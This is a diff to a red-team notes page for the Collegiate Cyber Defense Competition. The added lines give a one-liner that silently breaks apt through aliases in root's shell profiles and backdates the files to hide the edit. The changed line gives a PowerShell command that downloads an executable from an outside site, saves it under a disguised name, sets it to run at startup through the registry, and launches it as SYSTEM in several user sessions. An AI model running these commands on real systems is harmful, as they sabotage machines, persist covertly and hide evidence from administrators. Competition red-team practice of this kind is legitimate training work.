@@ -248,6 +248,8 @@ pagetitle: Red Teaming for CCDC
   - Corrupt bootloader partitions
 
 **Trolling on Linux**
+- Make `apt` useless:
+  - `sed -i '50i alias apt="apt -s"' /root/.bashrc; touch -d "Aug 8 2023" /root/.bashrc; sed -i '50i alias apt="apt -s"' /root/.zshrc; touch -d "Aug 8 2023" /root/.zshrc`
 - Wall on linux:
   - `wall "dance"`
 - Set language to german: `echo "loadkeys de && localectl set-locale de_DE.UTF-8 && localectl set-keymap de" >> ~/.bashrc`
@@ -264,7 +266,7 @@ pagetitle: Red Teaming for CCDC
   - GPO management > right-click domain > Create GPO in domain and link here > Right click on new GPO + edit > User Configuration\Policies\Administrative Templates\Desktop\Desktop > desktop wallpaper > select `enabled` + enter path of image and select fill for style > apply + ok > `gpupdate /force`
 - Make mouse shake: [cold_hands.exe](https://khaelkugler.com/misc_scripts/cold_hands.exe)
   - Script to make it happen and add to HKLM -> Run
-  - `iwr https://khaelkugler.com/misc_scripts/cold_hands.exe -o "C:\Program Files (x86)\Microsoft\Edge\Application\cold_hands.exe"; Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "ChillyFingers" -Value "C:\Program Files (x86)\Microsoft\Edge\Application\cold_hands.exe"; iwr https://download.sysinternals.com/files/PSTools.zip -o "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools.zip"; Expand-Archive "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools.zip" -d "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools\"; 1..5 | ForEach-Object { & "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools\psexec.exe" -i $_ -d -s "C:\Program Files (x86)\Microsoft\Edge\Application\cold_hands.exe" -accepteula }`
+  - `iwr https://khaelkugler.com/misc_scripts/cold_hands.exe -o "C:\Program Files (x86)\Microsoft\Edge\Application\joe_biden.exe"; Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "ChillyFingers" -Value "C:\Program Files (x86)\Microsoft\Edge\Application\joe_biden.exe"; iwr https://download.sysinternals.com/files/PSTools.zip -o "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools.zip"; Expand-Archive "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools.zip" -d "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools\"; 1..5 | ForEach-Object { & "C:\Program Files (x86)\Microsoft\Edge\Application\PSTools\psexec.exe" -i $_ -d -s "C:\Program Files (x86)\Microsoft\Edge\Application\joe_biden.exe" -accepteula }`
 - In another user's session with `.\psexec -i {session} -d -s powershell -command '{command}' -accepteula`
   - `-d` exits immediately 
 - Spawn 50 notepads:
